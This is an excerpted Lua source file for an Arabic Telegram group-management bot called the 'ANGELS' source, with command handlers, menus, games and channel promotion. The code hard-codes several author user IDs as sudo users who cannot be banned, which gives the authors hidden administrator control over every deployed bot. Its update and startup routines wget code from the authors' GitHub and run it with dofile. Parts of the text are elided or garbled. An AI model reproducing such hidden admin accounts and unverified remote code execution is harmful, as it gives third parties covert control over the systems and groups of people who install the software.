...
io.write('\27[1;31m 🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃  ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
token = sudos.token 
--- start functions 🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃
--------------------------------------------------------------------------------------------------------------
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/harwennotjoker/𝐀𝐍𝐆𝐄𝐋𝐒9/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1557685494,1613085306,972295724,1944393492}
...
if tonumber(user_id) == tonumber(1557685494) then  
var = true
elseif tonumber(user_id) == tonumber(1613085306) then
var = true
...
local UserName = (data.username_ or "angelsteamm")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼《𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒》")  
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'انجيلز') 
local DRAGON_Msg = { 
...
{{text = ' jokerrap',url="t.me/jokerrap2"}},
{{text = '𝚃𝙰𝚆𝙰𝚂𝙾𝙻',url="t.me/jokerrap22_BOT"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'المبرمج هروين💖 ',url="t.me/mhzon1"}}, 
{{text = 'المبرمج جوكر راب💖   ', url="t.me/jokerrap2"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if DevSoFi(msg) then
local bl = 'اهلا بكم ومرحبا ف سورس انجيلز'
local keyboard = {
...
local Text = ' ❤تم ارسال الملصق من 🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁?? \n - '..Name
...
os.execute('wget https://raw.githubusercontent.com/harwennotjoker/𝐀𝐍𝐆𝐄𝐋𝐒9/main/DRAGON.lua')
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/harwen7_7/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_, msg.id_,' ❤ اصدار سورس انجيلز{ 4x}')
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطورين السورس☎️', url="t.me/𝐀𝐍𝐆𝐄𝐋𝐒21"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/harwen7_7/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس انجيلز ادخل وتابع الجديد](t.me/angelsteamm)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒》', url="t.me/angelsteamm"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if text == '━┅┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒⟧⟝┄┉┉━' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس انجيلز ادخل وتابع الجديد](t.me/angelsteamm)
]] 
keyboard = {}  
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/angelsteamm)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/angelsteamm"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ❤ من أحسن السورسات على التليجرام سورس انجيلز ❤
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "انجيلز")
...
send(msg.chat_id_,0," ❤ الـعـضو  : {["..data.first_name_.."](T.ME/angelsteamm)}\n ❤ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ❤ عذرا  ⇦↯{["..data.first_name_.."](T.ME/angelsteamm)}\n ❤ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if text == 'تحديث السورس' and DevSoFi(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local angelsteamm = database:get(bot_id..'text:ch:user')
if angelsteamm then
send(msg.chat_id_, msg.id_,'['..angelsteamm..']')
else
send(msg.chat_id_, msg.id_,' 🎃  لا تستطيع استخدام البوت \n  🎃  يرجى الاشتراك بالقناه اولا \n  🎃  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
...
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/harwennotjoker/𝐀𝐍𝐆𝐄𝐋𝐒9/main/DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/harwennotjoker/𝐀𝐍𝐆𝐄𝐋𝐒9/main/library')
os.execute('wget https://raw.githubusercontent.com/harwennotjoker/𝐀𝐍𝐆𝐄𝐋𝐒9/main/File_Bot')
send(msg.chat_id_, msg.id_,' 🎃  تم تحديث السورس')
dofile('DRAGON.lua')  
end
...
if text == 'انجيلز' or text == 'سورس' or text == 'السورس' or text == 'source' or text == 'يا سورس' or text == '𝐀𝐍𝐆𝐄𝐋𝐒' then 
local Text = [[
 🎃 [𝑾𝑬𝑳𝑪𝑶𝑴𝑬 𝑺𝑶𝑼𝑹𝑪𝑬 𝐀𝐍𝐆𝐄𝐋𝐒](t.me/angelsteamm)🎃 
 🎃 [𝐀𝐍𝐆𝐄𝐋𝐒 𝙏𝙃𝙀 𝘽𝙀𝙎𝙏 𝙎𝙊𝙐𝙍𝘾𝙀 𝙄𝙉 𝙏𝙀𝙇𝙀](t.me/angelsteamm)🎃 
 🎃 [𝙊𝙑𝙀𝙍 𝙏𝙃𝙄𝙉𝙆𝙄𝙉𝙂 𝙆𝙄𝙇𝙇𝙎 𝙔𝙊𝙐𝙍 𝙃𝘼𝙋𝙋𝙄𝙉𝙀𝙎𝙎](t.me/angelsteamm) 🎃 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '  ❨  harwen  ',url="t.me/mhzon1"},{text = '  jokerrap  ❩ ',url="t.me/jokerrap2"}},
{{text = '  ❨  mostafa  ',url="t.me/elsaffal"},{text = '  namrod  ❩ ',url="t.me/H_S_A_7"}},

{{text = '  ❨  𝚃𝙰𝚆𝙰𝚂𝙾𝙻  ❩ ',url="t.me/harwen77_bot"}}, 
{{text = '  ❨  𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒  ❩ ',url="https://t.me/angelsteamm"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/hahahaha12334/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
local Text = [[
 𖠪 اهلا بك في سورس انجيلز الجمدان 𖠪
...
if text == 'جوكر راب' or text == 'مبرمج جوكر راب' or text == 'صاحب السورس' or text == 'جركن' or text == 'جوكر' or text == 'joker' then 
local msg_id = msg.id_/2097152/0.5  
local Text = [[ 
jokerrap
   ]] 
...
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/jokerrap2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'هروين' or text == 'هره' or text == 'هيروين' or text == 'هيوين' or text == 'هروينن' or text == 'harwen' then 
local msg_id = msg.id_/2097152/0.5  
local Text = [[ 
harwen
   ]] 
...
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/mhzon1&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text = [[
مطورين ومبرمجين سورس انجيلز اتبع الازرار للتواصل معهم ⬇️🧿
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'مبرمج هروين',url="t.me/mhzon1"}},
{{text = 'مبرمج جوكر راب',url="t.me/jokerrap2"}},
{{text = 'مبرمج مصطفي',url="t.me/elsaffal"}},
{{text = 'مبرمج نمرود',url="t.me/H_S_A_7"}},
}
local msg_id = msg.id_/2097152/0.5
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس انجيلز؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس انجيلز؟ ", 
"كم مره حبيت؟ ", 
...
if text == '《𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒》 ' then
local Text = [[ 
 ❤من أحسن السورسات على التليجرام سورس انجيلز ❤
حمايه.سرعه.دقه وامان
 قناه السورس ⬇️
  [W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒](http://t.me/angelsteamm)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒》 ', url="t.me/angelsteamm"}}, 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[𝚃𝙰𝚆𝙰𝚂𝙾𝙻](t.me/jokerrap22_BOT)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒》', url="t.me/jokerrap22_BOT"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/harwen7_7/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'العاب انجيلز' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ❤ اهلا في قائمه الالعاب المتطوره سورس انجيلز ❤ 
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '[《⬇️اتبع الازرار للتواصل مع》](t.me/angelsteamm)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
if tonumber(result.sender_user_id_) == tonumber(1613085306) then  
send(msg.chat_id_, msg.id_, " 🎃  لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(972295724) then  
...
function(arg,data) 
usertext = '\n ❤ الـعـضو   ⇦↯['..data.first_name_..'](t.me/'..(data.username_ or 'angelsteamm')..')'
...
send(msg.chat_id_, msg.id_, "بس يعم دا جوكر راب مبرمج دا \n")
return false 
end
if result.id_ == tonumber(1613085306) then
send(msg.chat_id_, msg.id_, " 🎃  لا تسطيع حظر مبرمج السورس عام \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(972295724) then  
...
usertext = '\n ❤ الـعـضو   ⇦↯['..result.title_..'](t.me/'..(username or 'angelsteamm')..')'
status  = '\n ❤ تم حظرو عام من الجروبات '
texts = usertext..status
...
send(msg.chat_id_, msg.id_, "بس يعم دا جوكر راب")
return false 
end
if tonumber(userid) == tonumber(1613085306) then  
send(msg.chat_id_, msg.id_, " 🎃  لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(972295724) then  
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/enhar/𝐀𝐍𝐆𝐄𝐋𝐒9/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ❤ اهلا بك في متجر ملفات انجيلز\n ❤ ملفات السورس 🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃 \n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃 \n ❤ علامة تعني { ✔️ } ملف مفعل\n ❤ علامة تعني { ✖ } ملف معطل\n ❤ قناة سورس انجيلز🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃 \n".." ❤ [اضغط هنا لدخول](t.me/angelsteamm) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/harwennotjoker/𝐀𝐍𝐆𝐄𝐋𝐒9/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ❤ عذرا الملف لايدعم سورس انجيلز\n") 
end
return false
end
...
if text == ("مسح قائمه انجيلز") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ❤ تم مسح قائمه انجيلز')
return false
end

if text == 'قائمه انجيلز' and Sudo(msg) then
...
if text == ("رفع انجيلز") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع انجيلز@(.*)$") and Sudo(msg) then
local username = text:match("^رفع انجيلز@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع انجيلز(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع انجيلز(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل انجيلز") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل انجيلز@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل انجيلز@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل انجيلز(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل انجيلز(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
t = "\n ❤ قائمه زوجات الجروب \n ❤▁▂▃▃▂▁❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒》 ](t.me/angelsteamm)❳▁▂▃▃▂▁??\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
' }\nء⧬━┅┅┄⟞❲[𝚂𝙾𝚄𝚁𝙲𝙴 𝙷??𝙶𝙰𝙽](t.me/angelsteamm)❳⟝┄┉┉━⧬'..
'\n ❤  علامة ال {✓} تعني مفعل'..
'\n ❤  علامة ال {✘} تعني معطل'..
'\nء🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃 '..
'\n'..' ❤  امر صيح  ⇦↯{ '..kickme..
...
' }\n'..' ❤  الايدي بالصوره  ⇦↯{ '..idph..
' }\n'..' ❤  الرفع  ⇦↯{ '..setadd..
' }\n'..' ❤  الحظر  ⇦↯{ '..banm..' }\n\n ❤▁▂▃▃▂▁❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒》 ](t.me/angelsteamm)❳▁▂▃▃▂▁ ❤\n ❤ قناة سورس انجيلز🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃 \n [ ❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒》 ](t.me/angelsteamm)❳](t.me/angelsteamm) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃 \nاضغط علي الاسم ليتم نسخه\n🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃 ٴ\n ❤ ❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒》 ](t.me/angelsteamm)❳ ❤ ')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'انجيلز').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'انجيلز')
local DRAGON_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس انجيلز🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨𝚂𝙾𝚄𝚁𝙲𝙴 ❩', url="t.me/angelsteamm"}},
} 
local msg_id = msg.id_/2097152/0.5 
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '《𝚂𝙾𝚄𝚁𝙲?? 𝐀𝐍𝐆𝐄𝐋𝐒》', url="t.me/angelsteamm"}},
}
local msg_id = msg.id_/2097152/0.5
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' 《𝚂𝙾𝚄𝚁𝙲𝙴 𝙷𝙾??𝙰??》', url="t.me/angelsteamm"}},
}
local msg_id = msg.id_/2097152/0.5
...
end --الكود حصري سورس انجيلزيعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'انجيلز').." غادر" or text == 'غادر' then  
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مطوري ولازم اعرصلك ينور عنيا🥺🤍](t.me/angelsteamm)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مطوري الثاني حته مني 😍💚](t.me/angelsteamm)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت المطور بس الصغنن 🌝💘](t.me/angelsteamm)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[نت المالك هن يعني حاجه فوق فوق راسي 😂♥](t.me/angelsteamm)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه??🤦‍♂️](t.me/angelsteamm)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/angelsteamm)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/angelsteamm)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/angelsteamm)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت مميز ابن ناس 😊 ](t.me/angelsteamm)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت مجرد عضو حقير ملكش لازمه 🌝💘 ](t.me/angelsteamm)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
[[
↑🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃 𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username ❤  
↑🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃 𝙄𝘿 ➱ #id
↑🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃 𝙍𝘼𝙉𝙆 ➱  #stast ❤  
↑🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃 𝙈𝘼𝙎𝙂 ➱ #msgs ❤  
↑🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃 𝗖𝗛 ➯  ↝@angelsteamm↜ ❤  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
?? 𝟔 𖡻 #msgs  ࿇🦄
...
keyboard.inline_keyboard = {
{
{text = 'رفع مطور', callback_data="/help3"},{text = 'رفع مطور ثانوي', callback_data="/help4"},
},
{
{text = 'رفع منشئ', callback_data="/help5"},{text = 'رفع منشئ اساسي', callback_data="/help6"},
},
{
{text = 'رفع مميز', callback_data="/help7"},
},
{
{text = 'رفع ادمن', callback_data="/help1"},{text = 'رفع مدير', callback_data="/help2"},
},
{
{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒》', url="t.me/angelsteamm"},
},
...
[🎯ألعاب سورس انجيلز الاحسن في التليجرام .↑]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [《𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒》 ](t.me/angelsteamm)
]]
keyboard = {} 
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃 
 اختر الامر الذي تريدها .↑🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃 
ده من الازرار بلاسفل . 🎃 ▁▂▃▃▂▁⟦𝐀𝐍𝐆𝐄𝐋𝐒⟧▁▂▃▃▂▁🎃 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒》 ](t.me/angelsteamm)❳ 
]]
keyboard = {} 
...
•┉ • ┉ • ┉ 《 𝐀𝐍𝐆𝐄𝐋𝐒》 ┉ • ┉ • ┉•
 ...
 ❤ مسح الجروبات
•┉ • ┉ • ┉ 《𝐀𝐍𝐆𝐄𝐋𝐒》 ┉ • ┉ • ┉•
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲e 𝐀𝐍𝐆𝐄𝐋𝐒.](t.me/angelsteamm)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
{
{text = '( source 𝐀𝐍𝐆𝐄𝐋𝐒 )', url="t.me/angelsteamm"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
if Text == '/add' then
local Teext =[[
🎮 اهلا بك في قسم الالعاب ..↑⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒⟧
🕹 اختر العبه الذي تريدفي الاسفل ..↑⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒⟧
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝐀𝐍𝐆𝐄𝐋𝐒》 ](t.me/angelsteamm)❳ 
]]
keyboard = {} 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'انجيلز')
